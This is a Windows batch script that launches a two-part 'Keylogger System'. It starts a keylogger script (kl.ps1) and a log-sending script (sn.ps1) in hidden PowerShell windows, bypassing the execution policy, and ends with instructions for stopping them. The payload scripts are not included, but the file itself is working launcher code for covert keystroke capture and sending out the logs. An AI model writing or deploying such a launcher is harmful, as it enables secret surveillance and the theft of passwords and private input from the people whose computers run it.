@echo off
:: RunBoth.bat - Launches kl.ps1 and sn.ps1 without visible windows
:: Created: %date%
:: Usage: Double-click this file

title Keylogger System Launcher
color 0A

:: Check if PowerShell scripts exist
if not exist "kl.ps1" (
    echo Error: kl.ps1 not found in current directory!
    pause
    exit /b 1
)

if not exist "sn.ps1" (
    echo Error: sn.ps1 not found in current directory!
    pause
    exit /b 1
)

:: Launch keylogger in hidden window
echo Starting Keylogger (kl.ps1)...
start "Keylogger" /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\kl.ps1"

:: Wait 2 seconds
timeout /t 2 >nul

:: Launch log sender in hidden window
echo Starting Log Sender (sn.ps1)...
start "Log Sender" /B powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ".\sn.ps1"

:: Display status
echo.
echo Both components launched successfully in background.
echo   - Keylogger (kl.ps1)
echo   - Log Sender (sn.ps1)
echo.
echo To close these hidden processes:
echo 1. Open Task Manager (Ctrl+Shift+Esc)
echo 2. Find these processes:
echo    - Windows PowerShell (for both scripts)
echo    - or look for processes named "kl" and "sn"
echo 3. Right-click and select "End Task" for each
echo.
pause